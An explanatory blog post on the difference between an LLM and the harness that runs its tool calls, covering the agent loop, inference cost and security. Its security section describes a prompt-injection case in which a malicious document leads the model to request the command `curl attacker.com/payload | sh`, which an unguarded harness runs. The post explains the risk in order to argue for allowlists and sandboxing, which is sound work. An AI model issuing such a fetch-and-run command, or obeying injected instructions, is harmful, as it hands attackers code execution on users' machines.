---
title: "AI Foundations · 02: The LLM does nothing. The harness does."
slug: modelo-vs-harness-llm-nao-faz-nada
date: 2026-06-13
publishDate: 2026-06-13
draft: false
description: "The most common mistake of 2026 is not separating the model from the harness. It costs money and security."
tags: ["llm", "agentes", "harness", "ia-foundations"]
images:
  - cover.png
---

When you asked Claude to create a file on your computer, it didn't create it. You think it did. But it wasn't the model. It was something else. And not knowing this is what makes teams pay 5x more than they should for AI in production, and open security holes where 1 malicious prompt leads to remote code execution.

This is the most common confusion of 2026, and the concept that separates people reasoning about AI from people repeating LinkedIn noise.

## The two things nobody separates

There are two distinct pieces when you use Claude Code, Codex, Cursor, or any agentic AI tool:

- **The model (LLM):** a multi-gigabyte file of weights loaded on a GPU. It only generates text. It never creates a file. Never runs a command. Never reaches the internet. Alone, it's an engine sitting off the car, on a bench.
- **The harness:** the program that talks to the LLM. It executes the actions the model asks for. Creates the file, runs the test, installs the package, opens the branch, pushes. Without a harness, the LLM only talks.

How the loop works in practice when you ask for "build me a site":

1. The harness sends your request to the LLM via API (along with hidden instructions from the system prompt).
2. The LLM answers in a structured format, something like `create_file("index.html", "<html>...</html>")`.
3. The harness receives that, executes the function, creates the file on your machine.
4. The harness reports back to the LLM: "file created, next step?".
5. The LLM answers: "now create style.css...".
6. The loop continues until the LLM says "done".

The LLM never touched your disk. Only the harness does.

## The horse and the harness

> "The harness is the rein you put on the horse to control it. Without the rein, the horse goes wherever it wants." Akita.

Another way to think about it: the model is the engine, the harness is the rest of the car. An engine without a car only makes noise. A car without an engine doesn't move. Together they form the vehicle. Talking about one without the other is talking about half a thing.

The LLM alone is GPT in the browser handing you text. Great for answering questions. Useless for acting.

## Why this matters for your wallet

In June 2026, Claude Opus 4.6 and GPT 5.4 are in a technical tie at the model level. Both handle code well. Both have comparable reasoning. The objective benchmarks keep converging.

So why does Claude Code beat Codex today on production code? Because Claude's harness is better: more disciplined (finishes parallel tasks without losing the thread), organizes long plans better (doesn't forget step 3 when it reaches step 7), documents what it did at the end (structured commit messages, project memory files).

OpenAI could match it tomorrow without training a new model. It's just software engineering on Codex.

The practical implication: whoever compares only models is looking at half the equation. "Claude is better than GPT" usually means "Claude Code is better than Codex". When an open source harness plugs in a Claude model, it works, but loses quality, because the model was trained for Anthropic's tool calling format and the open harness may speak another. The rule of thumb becomes: Claude models with Claude Code, GPT models with Codex, Gemini models with Antigravity. Model and harness come as a pair.

Direct cost: a bad harness sends the full context on every call. A good harness uses prompt caching, lazy loading of skills, sub-agents to isolate context. The difference in a production pipeline: a 3 to 10x factor on the monthly inference bill. Not an exaggeration. It's accounting.

## Why this matters for your security

The harness is the one with permission to write to disk, install packages, push to git, open network connections. The LLM doesn't have those permissions. It asks, the harness executes.

If the harness has no clear allowlist of what it can run, prompt injection becomes arbitrary code execution. A malicious document attached to the chat instructs the LLM to call `bash("curl attacker.com/payload | sh")`. Without protection, the harness obeys. The LLM is not at fault. It just passed the message along.

This is what separates a serious harness (tool sandboxing, permission scopes) from a loose one (any agent handing out shell access without an allowlist). Whoever understands the model-harness separation evaluates that risk. Whoever doesn't thinks "the AI executed the attack" and blames the wrong layer.

## Skills, agents, MCP: it's all the harness getting smarter

The AI industry talks a lot about skills, agents, sub-agents, MCP, tool calling, prompt caching, context windows. All of it is the harness getting more intelligent. The LLM remains the same thing underneath: it generates text.

- **A skill** is a `.md` file of instructions loaded when the context matches. It's the harness reusing prompts.
- **An agent** is a skill plus permissions plus an isolated context window. It's a more sophisticated harness.
- **MCP (Model Context Protocol)** is the standard for harnesses to connect to external tools uniformly. It's the harness standardizing integration.

Everything that looks like magic is the harness getting smarter. The LLM stays immutable between one call and the next.

## Confuse them, lose money and security

Whoever confuses model and harness can't reason about cost, security, or debugging. They'll pay more for the wrong model for the wrong reason, and grant the harness too much permission because they don't understand what each one does.

Whoever understands buys the right tool for the right reason, pays only what needs paying, and doesn't shoot their own foot with open scopes.

Next time you read "the AI created it", translate: the harness executed what the LLM asked. The difference changes everything.
